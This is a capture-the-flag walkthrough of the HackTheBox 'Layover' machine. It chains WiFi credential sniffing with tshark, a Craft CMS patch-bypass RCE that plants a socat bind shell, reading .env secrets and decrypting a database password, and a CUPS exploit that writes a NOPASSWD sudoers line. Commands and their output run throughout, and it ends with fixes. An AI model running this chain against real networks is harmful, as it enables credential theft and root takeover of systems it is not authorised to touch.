## **HackTheBox: Layover — Wireless Creds, a Craft CMS Patch-Bypass RCE, and a CUPS Root**

_A walkthrough of the "Layover" boot2root from HackTheBox Season 12. The box opens on an aviation network where the staff WiFi has no encryption at all, so a login flies past in cleartext. Those credentials get us into Craft CMS as a low-privilege editor, where a patch-bypass of CVE-2026-28695 turns an "admin-only" bug into authenticated blind RCE. From a www-data shell we read the app's security key and an encrypted database secret, decrypt it into a user's SSH password, and finish by abusing a root-owned CUPS daemon (CVE-2026-34990) that will happily print a NOPASSWD line straight into sudoers._

> Flags, passwords, keys, and the encrypted secret blob are redacted. Layover is an authorized training machine on HackTheBox; everything here was performed against a legal practice target. Flag values are shown as `<redacted>` and recovered secrets as `<redacted>` — real on the box but withheld here.

### **TL;DR**

<Callout type="tldr">

An **open WiFi** (`key_mgmt=NONE`) leaks a login over the air → `tshark` in monitor mode captures jenny's **cleartext credentials** to `portal.international.htb` → those creds log into **Craft CMS** as a low-priv Content Editor → a **CVE-2026-28695 patch bypass** (Yii2 behavior injection reached through the low-priv `element-search` action) gives **authenticated blind RCE**, delivered as a `socat` **bind shell** because the `escapeshellcmd()` filter kills reverse shells → as `www-data` we read `.env` (the Craft **security key**) and the database (an encrypted `mailRelayPassword` blob) → **decrypt the blob with the leaked key** to recover aporter's SSH password → **user flag** → a root-owned **CUPS** daemon on `127.0.0.1:631` is vulnerable to **CVE-2026-34990**: a rogue IPP server steals a `Local` auth token, which authorizes a `file://` printer that **prints a** **`NOPASSWD`** **line into** **`/etc/sudoers.d/`** → `sudo -i` → **root**.

Open-air password → RCE → leaked key → decrypted secret → printer-to-root.

</Callout>

### **The target**

```text
export IP=<target-ip>            # HTB machine entry point (ssh + rdp)
export ATTACKER_IP=<jumpbox-ip>  # airside-ws01, our position on the internal net
```

The external scan is deliberately bare — only remote-access services are exposed:

```text
nmap -sS -p- -Pn -T4 --min-rate=1000 $IP
# 22/tcp   open  ssh
# 3389/tcp open  ms-wbt-server
```

RDP lands us on a Windows-style jumpbox, `airside-ws01`, that sits on the airport's internal network:

```text
xfreerdp3 /v:$IP /u:contractor /p:'<redacted>' +clipboard /dynamic-resolution /drive:share,/tmp
```

From the jumpbox, the real environment appears: an internal `10.13.37.0/24` segment hosting `portal.international.htb`, and a staff WiFi (`HTB International WiFi`) that the jumpbox can hear over a simulated radio (`mac80211_hwsim`). That open WiFi is the whole first act.

### **The vulnerability — a patch that fixed the symptom, not the cause**

The foothold is **CVE-2026-28695**, an authenticated RCE in Craft CMS ≤ 5.9.8. The official fix (commit `e31e508`) narrowed the vulnerable `create()` call to `yii\base\BaseObject` subclasses and assumed only administrators could reach it. Both assumptions are wrong.

<Callout type="insight">

The root cause is **Yii2 behavior injection**, not an admin feature. `yii\behaviors\AttributeTypecastBehavior` _is_ a `BaseObject`, so it survives the filter and still chains to a `call_user_func()` sink. Worse, the gadget is reachable from the low-privilege **`element-search`** action — a non-Twig path that also side-steps `CRAFT_ENABLE_TWIG_SANDBOX`. The patch bolted the front door (admin) shut while a side window (editor-level element search) opened into the same room. **Patching a symptom (the admin context) is not patching the cause (behavior injection).**

</Callout>

One constraint shapes every payload downstream: the command runs through PHP's `escapeshellcmd()`, which neutralises shell metacharacters — no pipes, no redirects, no chaining. That kills the obvious reverse shell and forces a single-binary-with-arguments approach (`curl`, `socat`) for everything that follows.

### **Step 1 — Sniff cleartext credentials off the open WiFi**

The jumpbox has two radios: `wlan2` is associated normally, `wlan3` is free for capture. First find the AP's channel, then put `wlan3` into monitor mode on that same channel:

```text
iw dev wlan2 link
#   SSID: HTB International WiFi
#   freq: 2437.0          <- 2437 MHz = channel 6

sudo ip link set wlan3 down
sudo iw dev wlan3 set type monitor
sudo ip link set wlan3 up
sudo iw dev wlan3 set channel 6     # match the AP, or you hear nothing
```

With the radio on the right channel, capture and filter for HTTP POST bodies — login forms travel in the clear on an unencrypted network:

```text
sudo tshark -i wlan3 -Y "http.request.method == POST" -T fields \
  -e frame.time -e ip.src -e ip.dst -e http.host -e http.request.uri \
  -e urlencoded-form.key -e urlencoded-form.value
# 10.x.x.x -> 10.x.x.x  portal.international.htb  /miles/login.php  username,password  jenny,<redacted>
```

A staff member logging into the portal hands us **jenny's username and password in plaintext**, straight out of the air.

### **Step 2 — Authenticated blind RCE on Craft via the patch bypass**

jenny's creds authenticate to Craft's `/admin`, but she is only a **Content Editor** — the public PoC for CVE-2026-28695 expects admin and would dead-end here. The patch-bypass PoC reaches the gadget through `element-search` instead, so editor rights are enough. First confirm execution with a timing oracle:

```text
# PoC: gbuyssens/CVE-2026-28695-craft-rce-bypass
curl -s "https://raw.githubusercontent.com/gbuyssens/CVE-2026-28695-craft-rce-bypass/main/exploit.py" -o cve_exploit.py
# edit the script with jenny's credentials, then:
python3 cve_exploit.py http://portal.international.htb --check
# [+] authenticated as jenny
# [*] sleep 5 ...
# [+] RCE CONFIRMED — +5.06s injected latency
```

The execution is **blind** (no output returned) and the Craft host can't route back to our jumpbox, so a classic reverse shell fails twice over. The clean answer under `escapeshellcmd()` is a **bind shell** — the server opens a port and we connect in:

```text
python3 cve_exploit.py http://portal.international.htb --bind 4445
# [*] planting bind shell: setsid socat TCP-LISTEN:4445,reuseaddr,fork EXEC:/bin/sh
# [+] connect:  nc portal.international.htb 4445

nc portal.international.htb 4445
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Upgrade to a stable TTY:

```text
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z; stty raw -echo; fg
```

### **Step 3 — Loot the config: arbitrary file read → .env + database**

As `www-data`, the Craft project root (`/var/www/portal`) holds the keys to the next phase. The `.env` file leaks the application security key _and_ the database credentials:

```text
cat /var/www/portal/.env
# CRAFT_SECURITY_KEY=<redacted>
# CRAFT_DB_USER=craftuser
# CRAFT_DB_PASSWORD=<redacted>
# CRAFT_DB_DATABASE=craft
```

Those DB creds open the local MariaDB. The `users` table only has bcrypt hashes for `admin` and `jenny` — a tempting but slow rabbit hole. The real prize is the app's custom settings table:

```text
mysql -u craftuser -p
MariaDB [craft]> select name, value from htbairways_settings;
# mailRelayPassword | <redacted-blob>   (base64 AES blob)
# mailRelayHost     | mail.htbairways.htb
# mailRelayUser     | aporter
# mailRelayPort     | 587
```

### **Step 4 — Decrypt the mail-relay secret → user flag**

Craft stores the SMTP relay password encrypted at rest with `CRAFT_SECURITY_KEY`. Normally that's safe: the ciphertext lives in the database and the key lives in `.env`, two places an attacker rarely holds at once. Here, the Phase-2 file read collapses that separation — we have **both**.

<Callout type="insight">

**Encryption-at-rest only protects you while the key and the ciphertext stay apart.** Arbitrary file read hands over the key (`.env`) and DB access hands over the blob; together they reverse straight back to plaintext. Reusing that recovered SMTP password as a Linux login password is the final own-goal.

</Callout>

Replay Craft's own decryption routine with the leaked key to recover the plaintext:

```text
php -r '
require "/var/www/portal/vendor/autoload.php";
$key  = "<redacted>";
$blob = "<redacted-blob>";
$s = new yii\base\Security();
echo $s->decryptByKey(base64_decode($blob), $key) . "\n";
'
# <redacted>   (aporter's SMTP relay password)
```

That password is reused for the system account `aporter`:

```text
su aporter        # password: <redacted>
cat /home/aporter/user.txt
# <redacted>
```

### **Step 5 — Root via the CUPS IPP backdoor (CVE-2026-34990)**

As aporter, a root-owned CUPS scheduler is listening on loopback:

```text
ss -tlnp
# 127.0.0.1:631  LISTEN   (cupsd, running as root)
```

<Callout type="insight">

**CVE-2026-34990** abuses how `cupsd` authenticates "local" IPP requests. When CUPS validates a printer against an IPP backend, it retries with an `Authorization: Local <token>` header. A **rogue IPP server** on loopback answers `401` once to trigger that retry, then captures the token. With the token we drive privileged CUPS operations — create a printer whose `device-uri` is `file:///etc/sudoers.d/...`, flip it out of temporary state so it persists, then **Print-Job** our own content: CUPS writes the "document" to that file **as root**.

</Callout>

Stand up the rogue IPP listener and trigger CUPS to connect to it so the `Local` token is leaked:

```text
# rogue IPP server on 127.0.0.1:9189 — returns 401 once, then captures the token
python3 /tmp/rogue_ipp.py &

# make cupsd reach out to the rogue backend
ipptool -q -d "name=leak" -d "device=ipp://127.0.0.1:9189/ipp/print" \
  ipp://localhost:631/ /usr/share/cups/ipptool/cups-create-local-printer.test
# [+] TOKEN CAPTURED: <captured-token>
```

With the token, the exploit script issues the IPP chain against `/admin/`: `CUPS-Create-Local-Printer` with `device-uri=file:///etc/sudoers.d/aporter-cups`, `CUPS-Add-Modify-Printer` (`ppd-name=raw`, `printer-is-shared=true`, drop the temporary flag so it is written to `printers.conf`), `Accept-Jobs` + `Resume-Printer`, then a gzip-compressed `Print-Job` whose body is the sudoers line:

```text
# document written by the Print-Job, as root, into /etc/sudoers.d/aporter-cups
aporter ALL=(ALL) NOPASSWD:ALL
```

Every IPP op returns `0x0000` (success); the queued job flushes to disk once `cupsd` cycles, and the sudoers drop-in appears. From there it is a one-liner to root:

```text
sudo -l
# User aporter may run the following commands on portal:
#     (ALL) NOPASSWD: ALL
sudo -i
cat /root/root.txt
# <redacted>
```

Wireless password → Craft RCE → leaked key → decrypted secret → CUPS printer-to-root. Every hop reuses something the previous one leaked.

### **Impact**

<Callout type="critical">

**Critical — full remote compromise to root.** A representative score for the foothold RCE is **CVSS 3.1 8.8** (`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`): authenticated but low-privilege remote code execution, chained all the way to root. The chain stacks four distinct, attacker-reproducible failures:

- **No wireless encryption** — a staff login is readable by anyone in range; credentials cross the air in plaintext.
- **An incomplete security patch** — CVE-2026-28695's fix guarded the admin context, not the underlying Yii2 behavior injection, leaving an editor-level path to RCE.
- **Reversible secret storage** — once arbitrary file read exposes the security key, every "encrypted" value in the database (here an SMTP password reused for SSH) decrypts trivially.
- **A root-owned local service that writes attacker-controlled files** — CUPS (CVE-2026-34990) turns a captured local token into an arbitrary root file write, i.e. instant privilege escalation.

</Callout>

### **Recommended fix**

<Callout type="fix">

1. **Encrypt the wireless network.** WPA2/WPA3-Enterprise at minimum; never run a staff portal login over an open SSID, and serve the portal over HTTPS so credentials are not recoverable from the air.
2. **Patch the cause, not the context.** Upgrade Craft CMS past the CVE-2026-28695 bypass and constrain object instantiation by an allow-list of safe classes, not by caller privilege. Keep the Twig sandbox meaningful across _all_ code paths.
3. **Protect secrets at rest properly.** Store the application key outside the web root with least-privilege file permissions, don't run the web app as a user that can read it, and never reuse a service secret (SMTP) as a login password.
4. **Lock down CUPS.** Patch for CVE-2026-34990, disable `cups-browsed`/unneeded IPP backends, bind only to the socket you need, and treat any root daemon that can write arbitrary files as a privilege boundary to harden.

</Callout>

### **Takeaways**

- **Open WiFi is a credential firehose.** Monitor mode on the right channel plus a POST filter is all it takes to pull a plaintext login out of the air — encryption and HTTPS are not optional.
- **A patch that targets a symptom leaves the bug alive.** CVE-2026-28695 was "fixed" for admins, yet the real flaw (Yii2 behavior injection) stayed reachable from a lower-privileged action.
- **Defensive filters reshape exploits, they don't stop them.** `escapeshellcmd()` blocked reverse shells, so the attack pivoted to a bind shell and single-binary exfil — same RCE, different delivery.
- **Encryption-at-rest fails the moment one bug yields both key and ciphertext.** File read plus DB access turned a stored secret back into a plaintext password.
- **Enumerate root-owned local services.** The final hop wasn't a kernel bug — it was a root CUPS daemon tricked into printing a sudoers line.

Thanks for reading. Layover is a clean example of a chain where no single bug is exotic — open WiFi, an incomplete patch, a decryptable secret, a chatty print service — but each one hands the next exactly what it needs to climb from the parking lot to root.
